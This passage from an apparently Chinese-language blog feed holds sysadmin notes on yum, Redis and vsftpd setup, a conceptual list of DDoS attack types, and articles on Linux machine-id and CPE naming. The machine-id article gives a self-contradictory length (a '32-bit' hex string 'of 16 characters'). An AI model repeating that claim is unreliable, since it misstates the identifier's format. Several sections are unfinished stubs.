    <content type="html"><![CDATA[<span id="more"></span><h3 id="查看yum安装的服务"><a href="#查看yum安装的服务" class="headerlink" title="查看yum安装的服务"></a>查看yum安装的服务</h3><p>yum list installed </p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs llvm">[root<span class="hljs-title">@localhost</span> tmp]# yum list installed <br>已加载插件：fastestmirror<br>Loading mirror speeds from cached hostfile<br> * epel: mirrors.bfsu.edu.cn<br>已安装的软件包<br>NetworkManager.<span class="hljs-keyword">x</span><span class="hljs-number">86</span>_<span class="hljs-number">64</span>                                  <span class="hljs-number">1</span>:<span class="hljs-number">1.0</span>.<span class="hljs-number">6</span><span class="hljs-number">-27</span>.el<span class="hljs-number">7</span>           <span class="hljs-title">@anaconda</span><br>cpp.<span class="hljs-keyword">x</span><span class="hljs-number">86</span>_<span class="hljs-number">64</span>                                             <span class="hljs-number">4.8</span>.<span class="hljs-number">5</span><span class="hljs-number">-44</span>.el<span class="hljs-number">7</span>             <span class="hljs-title">@base</span>    <br>epel-<span class="hljs-keyword">release</span>.noarch                                    <span class="hljs-number">7</span><span class="hljs-number">-11</span>                     <span class="hljs-title">@extras</span>  <br>glibc.<span class="hljs-keyword">x</span><span class="hljs-number">86</span>_<span class="hljs-number">64</span>                                           <span class="hljs-number">2.17</span><span class="hljs-number">-324</span>.el<span class="hljs-number">7</span>_<span class="hljs-number">9</span>           <span class="hljs-title">@updates</span> <br>redis.<span class="hljs-keyword">x</span><span class="hljs-number">86</span>_<span class="hljs-number">64</span>                                           <span class="hljs-number">3.2</span>.<span class="hljs-number">12</span><span class="hljs-number">-2</span>.el<span class="hljs-number">7</span>             <span class="hljs-title">@epel</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>yunwei</category>
      
      <category>commands</category>
      
    </categories>
    
    
    <tags>
      
      <tag>yunwei</tag>
      
      <tag>tips</tag>
      
      <tag>commands</tag>
      
      <tag>yum</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>redis_base</title>
    <link href="/2024/04/16/yunwei/applications/redis/redis_base/"/>
    <url>/2024/04/16/yunwei/applications/redis/redis_base/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><h2 id=""><a href="#" class="headerlink" title=""></a></h2><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><h3 id="Centos"><a href="#Centos" class="headerlink" title="Centos"></a>Centos</h3><h4 id="添加-EPEL-存储库"><a href="#添加-EPEL-存储库" class="headerlink" title="添加 EPEL 存储库"></a>添加 EPEL 存储库</h4><p>sudo yum install epel-release</p><h4 id="安装Redis"><a href="#安装Redis" class="headerlink" title="安装Redis"></a>安装Redis</h4><p>sudo yum install redis</p><p>默认安装的版本为 3.2.12</p><h2 id="启动"><a href="#启动" class="headerlink" title="启动"></a>启动</h2>]]></content>
    
    
    <categories>
      
      <category>yunwei</category>
      
      <category>applications</category>
      
    </categories>
    
    
    <tags>
      
      <tag>yunwei</tag>
      
      <tag>applications</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ddos_type</title>
    <link href="/2024/04/08/security/netSec/ddos/ddos_type/"/>
    <url>/2024/04/08/security/netSec/ddos/ddos_type/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><p>网络层攻击：利用僵尸网络发送大量网络层报文形成超大带宽流量，拥塞带宽网络</p><p>会话耗尽攻击：利用僵尸网络发送大量TCP会话层报文，耗尽防火墙、负载均衡等基础设备的会话资源或目标服务器会话资源</p><p>应用层攻击：利用僵尸网络向目标服务器发送过量应用层请求，耗尽目标业务系统资源耗尽</p><p>华为</p><p><img src="/2024/04/08/security/netSec/ddos/ddos_type/image-20240408134821969.png" alt="image-20240408134821969"></p><p>网络层攻击</p><p><img src="/image-20240624194740673.png" alt="image-20240624194740673"></p><p>反射攻击</p><p><img src="/image-20240624194757652.png" alt="image-20240624194757652"></p><p>会话耗尽攻击</p><p><img src="/image-20240624194820818.png" alt="image-20240624194820818"></p><p><img src="/image-20240624194839328.png" alt="image-20240624194839328"></p><p>应用层攻击</p><p><img src="/image-20240624194904020.png" alt="image-20240624194904020"></p><p><img src="/image-20240624194925294.png" alt="image-20240624194925294"></p><p>IPv6攻击</p><p><img src="/image-20240624195007736.png" alt="image-20240624195007736"></p>]]></content>
    
    
    <categories>
      
      <category>security</category>
      
      <category>netSec</category>
      
      <category>ddos</category>
      
    </categories>
    
    
    <tags>
      
      <tag>security</tag>
      
      <tag>netSec</tag>
      
      <tag>ddos</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/2024/04/03/yunwei/applications/ftp/ftp/"/>
    <url>/2024/04/03/yunwei/applications/ftp/ftp/</url>
    
    <content type="html"><![CDATA[<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a><strong>简介</strong></h1><p>FTP（File Transfer Protocol）文件传输协议，用于在网络上进行文件传输的协议</p><h1 id="安装"><a href="#安装" class="headerlink" title="安装"></a><strong>安装</strong></h1><h2 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a><strong>Linux</strong></h2><p>Linux下常用的ftp工具为vsftp</p><h3 id="检查是否安装"><a href="#检查是否安装" class="headerlink" title="检查是否安装"></a><strong>检查是否安装</strong></h3><p>rpm -qa | grep vsftpd</p><h3 id="yum安装"><a href="#yum安装" class="headerlink" title="yum安装"></a><strong>yum安装</strong></h3><p>yum install vsftpd -y</p><h1 id="操作"><a href="#操作" class="headerlink" title="操作"></a><strong>操作</strong></h1><h2 id="启动"><a href="#启动" class="headerlink" title="启动"></a><strong>启动</strong></h2><p>service vsftpd start</p><p>systemctl start vsftpd</p><h2 id="停止"><a href="#停止" class="headerlink" title="停止"></a><strong>停止</strong></h2><p>service vsftpd stop</p><p>systemctl stop vsftpd</p><h2 id="状态"><a href="#状态" class="headerlink" title="状态"></a><strong>状态</strong></h2><p>service vsftpd status</p><p>systemctl status vsftpd</p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs dts">[root@iZbp1191gh7vw52537lyxrZ ~]<span class="hljs-meta"># service vsftpd status</span><br>Redirecting to <span class="hljs-keyword">/bin/</span>systemctl status vsftpd.service<br>● vsftpd.service - Vsftpd ftp daemon<br><span class="hljs-symbol">   Loaded:</span> loaded (<span class="hljs-keyword">/usr/</span>lib<span class="hljs-keyword">/systemd/</span>system/vsftpd.<span class="hljs-attr">service</span><span class="hljs-punctuation">;</span> <span class="hljs-attr">disabled</span><span class="hljs-punctuation">;</span> vendor preset: disabled)<br><span class="hljs-symbol">   Active:</span> inactive (dead)<br>[root@iZbp1191gh7vw52537lyxrZ ~]<span class="hljs-meta"># systemctl status vsftpd</span><br>● vsftpd.service - Vsftpd ftp daemon<br><span class="hljs-symbol">   Loaded:</span> loaded (<span class="hljs-keyword">/usr/</span>lib<span class="hljs-keyword">/systemd/</span>system/vsftpd.<span class="hljs-attr">service</span><span class="hljs-punctuation">;</span> <span class="hljs-attr">disabled</span><span class="hljs-punctuation">;</span> vendor preset: disabled)<br><span class="hljs-symbol">   Active:</span> inactive (dead)<br></code></pre></td></tr></table></figure><h1 id="默认信息"><a href="#默认信息" class="headerlink" title="默认信息"></a><strong>默认信息</strong></h1><h2 id="默认可执行文件"><a href="#默认可执行文件" class="headerlink" title="默认可执行文件"></a><strong>默认可执行文件</strong></h2><p>&#x2F;usr&#x2F;sbin&#x2F;vsftpd</p><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs swift">[root<span class="hljs-meta">@iZbp1191gh7vw52537lyxrZ</span> <span class="hljs-operator">~</span>]# ls <span class="hljs-operator">-</span>lat <span class="hljs-regexp">/usr/</span>sbin<span class="hljs-regexp">/vsftpd -rwxr-xr-x 1 root root 175440 6月  10 2021 /</span>usr<span class="hljs-regexp">/sbin/</span>vsftpd<br></code></pre></td></tr></table></figure><h2 id="默认安装配置目录"><a href="#默认安装配置目录" class="headerlink" title="默认安装配置目录"></a><strong>默认安装配置目录</strong></h2><p>&#x2F;etc&#x2F;vsftpd&#x2F;</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gradle">[root@iZbp1191gh7vw52537lyxrZ ~]# ls -ld <span class="hljs-regexp">/etc/</span>vsftpd<span class="hljs-regexp">/ drwxr-xr-x 2 root root 4096 4月   3 19:52 /</span>etc<span class="hljs-regexp">/vsftpd/</span><br></code></pre></td></tr></table></figure><h2 id="默认核心配置文件"><a href="#默认核心配置文件" class="headerlink" title="默认核心配置文件"></a><strong>默认核心配置文件</strong></h2><p>&#x2F;etc&#x2F;vsftpd&#x2F;vsftpd.conf</p><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs swift">[root<span class="hljs-meta">@iZbp1191gh7vw52537lyxrZ</span> <span class="hljs-operator">~</span>]# ls <span class="hljs-operator">-</span>lat <span class="hljs-regexp">/etc/</span>vsftpd<span class="hljs-regexp">/vsftpd.conf -rw------- 1 root root 5116 6月  10 2021 /</span>etc<span class="hljs-regexp">/vsftpd/</span>vsftpd.conf<br></code></pre></td></tr></table></figure><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">anonymous_enable</span>=<span class="hljs-literal">YES</span><br><span class="hljs-attr">local_enable</span>=<span class="hljs-literal">YES</span><br><span class="hljs-attr">write_enable</span>=<span class="hljs-literal">YES</span><br><span class="hljs-attr">local_umask</span>=<span class="hljs-number">022</span><br><span class="hljs-attr">dirmessage_enable</span>=<span class="hljs-literal">YES</span><br><span class="hljs-attr">xferlog_enable</span>=<span class="hljs-literal">YES</span><br><span class="hljs-attr">connect_from_port_20</span>=<span class="hljs-literal">YES</span><br><span class="hljs-attr">xferlog_std_format</span>=<span class="hljs-literal">YES</span><br><span class="hljs-attr">listen</span>=<span class="hljs-literal">NO</span><br><span class="hljs-attr">listen_ipv6</span>=<span class="hljs-literal">YES</span><br><br><span class="hljs-attr">pam_service_name</span>=vsftpd<br><span class="hljs-attr">userlist_enable</span>=<span class="hljs-literal">YES</span><br><span class="hljs-attr">tcp_wrappers</span>=<span class="hljs-literal">YES</span><br></code></pre></td></tr></table></figure><h3 id="配置说明"><a href="#配置说明" class="headerlink" title="配置说明"></a><strong>配置说明</strong></h3><p>anonymous_enable&#x3D;YES # 允许匿名登录</p><p>local_enable&#x3D;YES # 允许本地用户登录</p><p>write_enable&#x3D;YES # 允许写操作</p><p>local_umask&#x3D;022 # 新增文件权限，默认022</p><h2 id="默认日志"><a href="#默认日志" class="headerlink" title="默认日志"></a><strong>默认日志</strong></h2><p>yum 安装默认没有开启日志功能，需要额外配置</p><p>常见日志路径&#x2F;var&#x2F;log&#x2F;vsftpd.log</p><p>日志开启配置</p><h1 id="ftp远程连接"><a href="#ftp远程连接" class="headerlink" title="ftp远程连接"></a><strong>ftp远程连接</strong></h1><h2 id="Linux-1"><a href="#Linux-1" class="headerlink" title="Linux"></a><strong>Linux</strong></h2><h3 id="ftp命令"><a href="#ftp命令" class="headerlink" title="ftp命令"></a><strong>ftp命令</strong></h3><p>命令安装</p><p>yum install ftp -y</p><p>连接</p><p>ftp ftp.example.com</p><figure class="highlight coffeescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs coffeescript">(base) [root@aliyun ~]<span class="hljs-comment"># ftp 1.1.1.1 Connected to 1.1.1.1 (1.1.1.1). 220 sinacloud ftp ready. Name (1.1.1.16:root): anonymous 331 Username ok, send password. Password: 530 Authentication failed.id: 003</span><br></code></pre></td></tr></table></figure><p>如果支持匿名访问，用户名可以输入<strong>anonymous</strong>，密码为<strong>邮件地址</strong>或者<strong>空</strong></p><h3 id="lftp命令"><a href="#lftp命令" class="headerlink" title="lftp命令"></a><strong>lftp命令</strong></h3><h4 id="命令安装"><a href="#命令安装" class="headerlink" title="命令安装"></a><strong>命令安装</strong></h4><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmake">yum <span class="hljs-keyword">install</span> lftp -y<br></code></pre></td></tr></table></figure><h4 id="连接默认端口"><a href="#连接默认端口" class="headerlink" title="连接默认端口"></a><strong>连接默认端口</strong></h4><p>lftp <a href="ftp://ftp.example.com/">ftp://ftp.example.com</a></p><figure class="highlight dart"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dart">(<span class="hljs-keyword">base</span>) [root<span class="hljs-meta">@aliyun</span> ~]# lftp ftp:<span class="hljs-comment">//1.1.1.1 lftp 1.1.1.1:~&gt; ls</span><br></code></pre></td></tr></table></figure><h4 id="连接指定端口"><a href="#连接指定端口" class="headerlink" title="连接指定端口"></a><strong>连接指定端口</strong></h4><p>lftp <a href="ftp://ftp.example.com:port">ftp://ftp.example.com:port</a></p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">[root<span class="hljs-title">@nvm</span> /]# lftp ftp://<span class="hljs-number">1.1</span>.<span class="hljs-number">1.1</span>:<span class="hljs-number">2121</span> lftp <span class="hljs-number">1.1</span>.<span class="hljs-number">1.1</span>:~&gt; ls drwxr-xr-<span class="hljs-keyword">x</span>    <span class="hljs-number">2</span> <span class="hljs-number">0</span>        <span class="hljs-number">0</span>            <span class="hljs-number">4096</span> Aug <span class="hljs-number">06</span>  <span class="hljs-number">2019</span> pub drwxr-xrwx    <span class="hljs-number">4</span> <span class="hljs-number">0</span>        <span class="hljs-number">0</span>            <span class="hljs-number">4096</span> Nov <span class="hljs-number">11</span>  <span class="hljs-number">2020</span> report drwxr-xr-<span class="hljs-keyword">x</span>    <span class="hljs-number">2</span> <span class="hljs-number">0</span>        <span class="hljs-number">0</span>            <span class="hljs-number">4096</span> May <span class="hljs-number">24</span>  <span class="hljs-number">2021</span> test drwxr-xr-<span class="hljs-keyword">x</span>    <span class="hljs-number">3</span> <span class="hljs-number">0</span>        <span class="hljs-number">0</span>           <span class="hljs-number">12288</span> Mar <span class="hljs-number">12</span>  <span class="hljs-number">2023</span> tmp drwxr-xrwx   <span class="hljs-number">27</span> <span class="hljs-number">0</span>        <span class="hljs-number">0</span>           <span class="hljs-number">12288</span> Jul <span class="hljs-number">15</span> <span class="hljs-number">07</span>:<span class="hljs-number">56</span> upload<br></code></pre></td></tr></table></figure><h1 id="ftp操作命令"><a href="#ftp操作命令" class="headerlink" title="ftp操作命令"></a><strong>ftp操作命令</strong></h1><h2 id="ls-dir"><a href="#ls-dir" class="headerlink" title="ls&#x2F;dir"></a><strong>ls&#x2F;dir</strong></h2><p>列出当前路径下文件及文件夹</p><figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs tap">[root@nvm /]<span class="hljs-comment"># lftp ftp://1.1.1.1:2121</span><br>lftp 1.1.1.1:~&gt; ls<br>drwxr-xr-x   <span class="hljs-number"> 2 </span>0       <span class="hljs-number"> 0 </span>          <span class="hljs-number"> 4096 </span>Aug<span class="hljs-number"> 06 </span><span class="hljs-number"> 2019 </span>pub<br>drwxr-xrwx   <span class="hljs-number"> 4 </span>0       <span class="hljs-number"> 0 </span>          <span class="hljs-number"> 4096 </span>Nov<span class="hljs-number"> 11 </span><span class="hljs-number"> 2020 </span>report<br>drwxr-xr-x   <span class="hljs-number"> 2 </span>0       <span class="hljs-number"> 0 </span>          <span class="hljs-number"> 4096 </span>May<span class="hljs-number"> 24 </span><span class="hljs-number"> 2021 </span>test<br>drwxr-xr-x   <span class="hljs-number"> 3 </span>0       <span class="hljs-number"> 0 </span>         <span class="hljs-number"> 12288 </span>Mar<span class="hljs-number"> 12 </span><span class="hljs-number"> 2023 </span>tmp<br>drwxr-xrwx  <span class="hljs-number"> 27 </span>0       <span class="hljs-number"> 0 </span>         <span class="hljs-number"> 12288 </span>Jul<span class="hljs-number"> 15 </span>07:56 upload<br>lftp 1.1.1.1:/&gt; dir<br>drwxr-xr-x   <span class="hljs-number"> 2 </span>0       <span class="hljs-number"> 0 </span>          <span class="hljs-number"> 4096 </span>Aug<span class="hljs-number"> 06 </span><span class="hljs-number"> 2019 </span>pub<br>drwxr-xrwx   <span class="hljs-number"> 4 </span>0       <span class="hljs-number"> 0 </span>          <span class="hljs-number"> 4096 </span>Nov<span class="hljs-number"> 11 </span><span class="hljs-number"> 2020 </span>report<br>drwxr-xr-x   <span class="hljs-number"> 2 </span>0       <span class="hljs-number"> 0 </span>          <span class="hljs-number"> 4096 </span>May<span class="hljs-number"> 24 </span><span class="hljs-number"> 2021 </span>test<br>drwxr-xr-x   <span class="hljs-number"> 3 </span>0       <span class="hljs-number"> 0 </span>         <span class="hljs-number"> 12288 </span>Mar<span class="hljs-number"> 12 </span><span class="hljs-number"> 2023 </span>tmp<br>drwxr-xrwx  <span class="hljs-number"> 27 </span>0       <span class="hljs-number"> 0 </span>         <span class="hljs-number"> 12288 </span>Jul<span class="hljs-number"> 15 </span>07:56 upload<br></code></pre></td></tr></table></figure><h2 id="cd-dirname"><a href="#cd-dirname" class="headerlink" title="cd dirname"></a><strong>cd dirname</strong></h2><p>切换目录</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs elixir">lftp <span class="hljs-number">1.1</span>.<span class="hljs-number">1.1</span><span class="hljs-symbol">:/&gt;</span> cd pub lftp <span class="hljs-number">1.1</span>.<span class="hljs-number">1.1</span><span class="hljs-symbol">:/pub&gt;</span><br></code></pre></td></tr></table></figure><h2 id="put-local-file-remote-fil"><a href="#put-local-file-remote-fil" class="headerlink" title="put local-file remote-fil"></a>put local-file remote-fil</h2><h2 id="quit-bye"><a href="#quit-bye" class="headerlink" title="quit&#x2F;bye"></a><strong>quit&#x2F;bye</strong></h2><p>退出会话</p><p>lftp 1.1.1.1:&#x2F;pub&gt; quit (base) [root@nvm &#x2F;]# lftp <a href="ftp://1.1.1.1/">ftp://1.1.1.1</a> lftp 1.1.1.1:~&gt; bye (base) [root@nvm &#x2F;]#</p><h2 id="put-mput"><a href="#put-mput" class="headerlink" title="put&#x2F;mput"></a><strong>put&#x2F;mput</strong></h2><p>上传文件</p><h1 id="风险"><a href="#风险" class="headerlink" title="风险"></a><strong>风险</strong></h1><h2 id="匿名访问风险"><a href="#匿名访问风险" class="headerlink" title="匿名访问风险"></a><strong>匿名访问风险</strong></h2><p>用户名 <strong>anonymous</strong>，密码为<strong>邮件地址</strong>或者<strong>空</strong></p><p><strong>默认安装的</strong></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>machine_id</title>
    <link href="/2024/04/03/yunwei/machine_id/"/>
    <url>/2024/04/03/yunwei/machine_id/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>在 Linux 系统中，每台计算机都有一个唯一的标识符，称为机器 ID（Machine ID）。机器 ID 是一个由操作系统生成的字符串，用于标识特定的计算机。它在系统启动时自动生成，并且在系统的整个生命周期中保持不变。本文将详细介绍机器 ID 的作用、生成方式以及在 Linux 系统中的应用。</p><h2 id="机器-ID-的生成方式"><a href="#机器-ID-的生成方式" class="headerlink" title="机器 ID 的生成方式"></a>机器 ID 的生成方式</h2><p>Linux 系统中的机器 ID 是通过以下方式生成的：</p><h3 id="systemd"><a href="#systemd" class="headerlink" title="systemd"></a>systemd</h3><p>在现代的 Linux 发行版中，机器 ID 是由 systemd 生成和管理的。systemd 是一个系统和服务管理器，它负责启动、停止和管理系统上的各种进程和服务。当系统启动时，systemd 会生成一个机器 ID 并将其存储在 <code>/etc/machine-id</code> 文件中。这个文件是一个只包含机器 ID 的纯文本文件。</p><p>&#x2F;etc&#x2F;machine-id 文件默认权限</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs elixir">root<span class="hljs-variable">@iZbp1191gh7vw52537lyxrZ</span><span class="hljs-symbol">:/var/log</span><span class="hljs-comment"># ls -lat /etc/machine-id</span><br>-r--r--r-- <span class="hljs-number">1</span> root root <span class="hljs-number">33</span> <span class="hljs-title class_">Jun</span> <span class="hljs-number">13</span>  <span class="hljs-number">2023</span> /etc/machine-id<br></code></pre></td></tr></table></figure><h3 id="生成规则"><a href="#生成规则" class="headerlink" title="生成规则"></a>生成规则</h3><p>机器 ID 是一个 32 位的十六进制字符串，由 16 个字符组成。生成机器 ID 的规则如下：</p><ul><li>首先，系统会尝试读取 <code>/etc/machine-id</code> 文件。如果该文件存在且内容有效，则将其用作机器 ID。</li><li>如果 <code>/etc/machine-id</code> 文件不存在或内容无效，则系统会生成一个新的机器 ID，并将其写入 <code>/etc/machine-id</code> 文件中。</li></ul><h2 id="机器-ID-的作用"><a href="#机器-ID-的作用" class="headerlink" title="机器 ID 的作用"></a>机器 ID 的作用</h2><p>机器 ID 在 Linux 系统中具有以下作用：</p><h3 id="唯一标识符"><a href="#唯一标识符" class="headerlink" title="唯一标识符"></a>唯一标识符</h3><p>机器 ID 是用来唯一标识一台计算机的。通过机器 ID，系统可以识别不同的计算机，并进行一些特定的操作和配置。</p><h3 id="许可验证"><a href="#许可验证" class="headerlink" title="许可验证"></a>许可验证</h3><p>一些软件和服务提供商可能使用机器 ID 来验证许可证和授权。通过检查机器 ID，他们可以确定软件是否在授权范围内运行。</p><h3 id="安全性"><a href="#安全性" class="headerlink" title="安全性"></a>安全性</h3><p>机器 ID 在安全性方面也起到了一定的作用。它可以用于生成一些加密密钥或用于加密通信，以确保只有具有特定机器 ID 的计算机才能解密和访问数据。</p><h3 id="系统配置"><a href="#系统配置" class="headerlink" title="系统配置"></a>系统配置</h3><p>机器 ID 还可以用于系统配置和管理。一些配置文件和脚本可能会根据机器 ID 进行不同的操作或应用不同的设置。</p><h2 id="使用机器-ID"><a href="#使用机器-ID" class="headerlink" title="使用机器 ID"></a>使用机器 ID</h2><p>在 Linux 系统中，可以使用机器 ID 来进行一些操作和配置。</p><h3 id="查看机器-ID"><a href="#查看机器-ID" class="headerlink" title="查看机器 ID"></a>查看机器 ID</h3><p>要查看当前计算机的机器 ID，可以使用以下命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> /etc/machine-id<br></code></pre></td></tr></table></figure><h3 id="使用机器-ID-进行其他操作"><a href="#使用机器-ID-进行其他操作" class="headerlink" title="使用机器 ID 进行其他操作"></a>使用机器 ID 进行其他操作</h3><p>除了查看机器 ID，还可以在以下情况下使用机器 ID 进行操作和配置：</p><ul><li>许可验证：某些软件和服务可能需要验证机器 ID 才能使用许可证进行授权。在这种情况下，你可以将机器 ID 提供给软件或服务提供商以进行许可证验证。</li><li>系统配置：一些配置文件或脚本可能会使用机器 ID 进行不同的操作或应用不同的设置。你可以根据机器 ID 编写脚本或配置文件，以根据不同的机器 ID 进行特定的配置。</li><li>安全性：机器 ID 可用于增加系统的安全性。例如，你可以使用机器 ID 生成一些加密密钥，以确保只有具有特定机器 ID 的计算机才能解密和访问数据。</li></ul><h2 id="机器-ID-的注意事项"><a href="#机器-ID-的注意事项" class="headerlink" title="机器 ID 的注意事项"></a>机器 ID 的注意事项</h2><p>在使用机器 ID 时，需要注意以下事项：</p><ul><li>唯一性：机器 ID 应该是唯一的，每台计算机都应该有不同的机器 ID。确保在克隆或复制系统时更新机器 ID。</li><li>保密性：机器 ID 是一个敏感信息，应该妥善保管。避免将机器 ID 泄露给不信任的人或系统。</li><li>持久性：机器 ID 在系统的整个生命周期中保持不变。在更换硬件或重新安装操作系统时，机器 ID 通常不会改变。</li></ul><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>机器 ID 是 Linux 系统中用于唯一标识计算机的标识符。它由 systemd 生成并存储在 <code>/etc/machine-id</code> 文件中。机器 ID 在许可验证、安全性和系统配置方面发挥着重要作用。通过机器 ID，系统可以识别不同的计算机并进行特定的操作和配置。在使用机器 ID 时，请确保唯一性、保密性和持久性，并根据需要使用相应的命令和配置文件来操作和配置系统。</p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p>开发者社区&#x2F;龙蜥操作系统&#x2F;文章&#x2F;什么是 Linux 中的机器 ID？<a href="https://developer.aliyun.com/article/1319056">https://developer.aliyun.com/article/1319056</a></p>]]></content>
    
    
    <categories>
      
      <category>yunwei</category>
      
    </categories>
    
    
    <tags>
      
      <tag>yunwei</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>cpe</title>
    <link href="/2024/04/03/yunwei/cpe/"/>
    <url>/2024/04/03/yunwei/cpe/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>Common Platform Enumeration 通用平台枚举</p><p>以标准化方式为软件应用程序、操作系统及硬件命令的方法</p><h2 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h2><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs elixir"><span class="hljs-symbol">cpe:</span>/&lt;part&gt;<span class="hljs-symbol">:&lt;vendor&gt;</span><span class="hljs-symbol">:&lt;product&gt;</span><span class="hljs-symbol">:&lt;version&gt;</span><span class="hljs-symbol">:&lt;update&gt;</span><span class="hljs-symbol">:&lt;edition&gt;</span><span class="hljs-symbol">:&lt;language&gt;</span><br></code></pre></td></tr></table></figure><h3 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h3><p>cpe:&#x2F;o:almalinux:almalinux:9::baseos</p><h3 id="参数解释"><a href="#参数解释" class="headerlink" title="参数解释"></a>参数解释</h3><h4 id="part-目标类型"><a href="#part-目标类型" class="headerlink" title="part 目标类型"></a>part 目标类型</h4><p>可选的值：<br>a 应用程序</p><p>h 硬件平台</p><p>o 操作系统</p><h4 id="vendor-厂商"><a href="#vendor-厂商" class="headerlink" title="vendor 厂商"></a>vendor 厂商</h4><h4 id="product-产品名称"><a href="#product-产品名称" class="headerlink" title="product 产品名称"></a>product 产品名称</h4><h4 id="version-厂商提供的产品版本号"><a href="#version-厂商提供的产品版本号" class="headerlink" title="version 厂商提供的产品版本号"></a>version 厂商提供的产品版本号</h4><h4 id="update-厂商提供的产品更新版本，细粒度更小"><a href="#update-厂商提供的产品更新版本，细粒度更小" class="headerlink" title="update 厂商提供的产品更新版本，细粒度更小"></a>update 厂商提供的产品更新版本，细粒度更小</h4><h4 id="edition-发行版本，属于被弃用的属性，一般是为了兼容更早-CPE-版本，默认值为-ANY"><a href="#edition-发行版本，属于被弃用的属性，一般是为了兼容更早-CPE-版本，默认值为-ANY" class="headerlink" title="edition 发行版本，属于被弃用的属性，一般是为了兼容更早 CPE 版本，默认值为 ANY"></a>edition 发行版本，属于被弃用的属性，一般是为了兼容更早 CPE 版本，默认值为 ANY</h4><h4 id="language-界面语言"><a href="#language-界面语言" class="headerlink" title="language  界面语言"></a>language  界面语言</h4><h4 id="se-edittion-表示产品是针对某些特定市场或类别的目标用户"><a href="#se-edittion-表示产品是针对某些特定市场或类别的目标用户" class="headerlink" title="se_edittion  表示产品是针对某些特定市场或类别的目标用户"></a>se_edittion  表示产品是针对某些特定市场或类别的目标用户</h4><h4 id="target-sw-产品运行需要的软件环境"><a href="#target-sw-产品运行需要的软件环境" class="headerlink" title="target_sw 产品运行需要的软件环境"></a>target_sw 产品运行需要的软件环境</h4><h4 id="target-hw-产品运行需要的硬件环境"><a href="#target-hw-产品运行需要的硬件环境" class="headerlink" title="target_hw  产品运行需要的硬件环境"></a>target_hw  产品运行需要的硬件环境</h4><h4 id="other-表示无法归类上上述其他属性的值"><a href="#other-表示无法归类上上述其他属性的值" class="headerlink" title="other 表示无法归类上上述其他属性的值"></a>other 表示无法归类上上述其他属性的值</h4><p>如果在 WFN 未使用某个属性，则称为未指明的属性，默认值未 ANY。<code>sw_edition</code> <code>target_sw</code> <code>target_hw</code> <code>other</code> 是新引入的属性，被称作扩展属性</p><p><img src="https://pic3.zhimg.com/80/v2-d30d689a214231eb3f3e0fa143a192de_720w.webp" alt="img"></p><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><p>网络安全知识图谱构建之CPE通用组件数据集 <a href="https://zhuanlan.zhihu.com/p/282898536">https://zhuanlan.zhihu.com/p/282898536</a></p>]]></content>
    
    
    <categories>
      
      <category>yunwei</category>
      
    </categories>
